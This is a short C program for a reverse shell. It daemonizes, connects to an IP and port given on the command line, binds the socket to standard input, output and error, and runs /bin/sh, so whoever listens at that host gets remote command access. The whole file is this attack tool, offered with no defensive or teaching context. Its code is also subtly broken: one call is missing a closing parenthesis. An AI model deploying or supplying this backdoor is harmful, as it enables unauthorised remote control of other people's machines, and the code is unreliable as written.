#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>


int main(int argc, char *argv[])
{
  int sd;
  struct sockaddr_in servaddr;

  if (argc != 3) {
    printf("Usage: %s <ip> <port>\n", argv[0]);
    exit(-1);
  }
  
  daemon(1, 0);
  
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = inet_addr(argv[1];
  servaddr.sin_port = htons(atoi(argv[2]));

  sd = socket(PF_INET, SOCK_STREAM, 0);
  if (connect(sd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    perror("connect() failed");

  dup2(sd, 0);
  dup2(sd, 1);
  dup2(sd, 2);
  execl("/bin/sh", "sh", 0);
}
